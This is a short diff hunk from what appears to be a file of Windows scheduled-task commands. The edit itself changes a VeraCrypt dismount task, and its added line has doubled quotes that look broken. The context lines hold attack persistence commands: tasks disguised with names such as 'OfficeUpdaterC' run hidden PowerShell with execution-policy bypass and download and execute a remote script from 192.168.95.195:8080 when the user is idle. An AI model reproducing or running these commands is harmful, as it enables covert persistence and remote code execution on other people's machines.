@@ -1137,7 +1137,7 @@ schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v
 #(X64) - On User Idle (30mins)
 schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 
-$action = New-ScheduledTaskAction -Execute "C:\Path\To\VeraCrypt.exe" -Argument "/dismount /force /all"
+$action = New-ScheduledTaskAction -Execute ""C:\Program Files\VeraCrypt\VeraCrypt.exe"" -Argument "/d /f /q"
 $trigger = New-ScheduledTaskTrigger -Daily -At "5:00PM"
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
 Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "Fix Mount" 
